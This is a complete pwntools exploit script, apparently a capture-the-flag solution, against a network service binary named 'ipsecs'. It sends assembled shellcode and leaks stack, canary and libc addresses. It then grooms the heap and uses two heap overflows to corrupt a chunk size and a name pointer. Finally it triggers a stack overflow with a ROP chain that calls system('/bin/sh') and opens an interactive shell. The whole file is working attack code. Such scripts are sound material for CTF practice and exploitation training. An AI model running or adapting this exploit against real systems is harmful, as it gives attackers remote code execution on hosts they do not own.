#!/usr/bin/env python3

from pwn import *

BIN  = './ipsecs'
LIBC = './libc.so.6'
libc = ELF(LIBC)

context.clear(arch='amd64', os='linux')

def start():
  global io
  if args.LOCAL:
    os.system("docker exec -i ipsecs bash -c 'kill -9 `pidof ipsecs`'")
    io = remote('localhost', 11111)
  else:
    io = remote(sys.argv[1], int(sys.argv[2]))

def store(idx, l, data):
  assert(idx < 0x10)
  assert(len(data) < 0xe8)
  p  = b''
  p += b'SAVE'.ljust(8, b'\x00')
  p += p64(idx)
  p += b'STORE'.ljust(8, b'\x00')
  p += p64(l)
  p += data
  io.send(p)
  io.recvline()

def load(idx, data=b''):
  assert(idx < 0x10)
  p  = b''
  p += b'SAVE'.ljust(8, b'\x00')
  p += p64(idx)
  p += b'LOAD'.ljust(8, b'\x00')
  p += data
  io.send(p)
  io.recvline()
  io.recvline()
  io.recvuntil(b'Data  ')
  return io.recvuntil(b' \n', drop=True)

def delete(idx):
  assert(idx < 0x10)
  p  = b''
  p += b'SAVE'.ljust(8, b'\x00')
  p += p64(idx)
  p += b'DELETE'.ljust(8, b'\x00')
  io.send(p)
  io.recvline()

def dbg():
  pause()
  p  = b''
  p += b'LOG'.ljust(8, b'\x00')
  p += b'X'*0x100
  io.send(p)
  io.recvline()
  io.recvline()

def malloc(idx, chunksz, data=b'\x00'):
  assert(chunksz & 0x0F == 0x00)
  assert(chunksz >= 0x20)
  assert(chunksz <= 0xe0)
  store(idx, chunksz-0x08, data)

def free(idx):
  delete(idx)

def xpl01t():
  start()

  pause()
  os.system('nasm -f bin proxy.nasm')
  proxy = open('proxy', 'rb').read() 
  assert(not b'\n' in proxy)
  io.sendline(proxy)

  io.recvuntil(p64(0x1337deadbeef))
  binary = u64(io.recv(8))                 # binary address (actually, unused)
  log.debug(f'binary @ {binary:#x}')
  stack = u64(io.recv(8)) - 0x518          # address of  stack buffer with overflow
  log.debug(f'stack @ {stack:#x}')
  canary = u64(io.recv(8))                 # canary
  log.debug(f'canary @ {canary:#x}')
  libc.address = u64(io.recv(8)) - 0x8ce80 # libc base address
  log.debug(f'libc @ {libc.address:#x}')

  # Just heap-hop
  malloc(0x00, 0x30)
  malloc(0x01, 0x30)
  free(0x00)
  malloc(0x02, 0x20)
  malloc(0x03, 0x20)
  malloc(0x04, 0xe0)
  malloc(0x05, 0xe0)
  malloc(0x06, 0xe0)
  malloc(0x07, 0xe0)
  # First heap buffer overflow
  # Need to increase size of next chunk and force malloc to realloc memory right after original chunk
  # With such corruption we'll force malloc to write chunk size in place of `current->length`
  malloc(0x00, 0x30, b'X'*0x28+p16(0x4b1))
  free(0x00)
  free(0x01)
  free(0x02)
  malloc(0x00, 0x80)
  malloc(0x08, 0x30)
  # Second heap buffer overflow
  # Need to overwrite `current->name`
  malloc(0x01, 0x30, b'X'*0xa0+p64(stack - 0x110 + 0x18 - 0x108))

  # Prepare ROP-chain
  rop = ROP(libc)
  rop.raw(rop.ret.address)
  rop.call(libc.symbols['system'], (next(libc.search(b'/bin/sh\x00')),))

  # Overflow payload
  p  = b''
  p += p64(canary) # restore canary
  p += b'X'*0x08   # don't care about saved rbp
  p += rop.chain() # ROP-chain

  # Load corrupted entry to trigger stack buffer overflow
  load(0x03, data=p)

  io.interactive()

if __name__ == '__main__':
  xpl01t() 
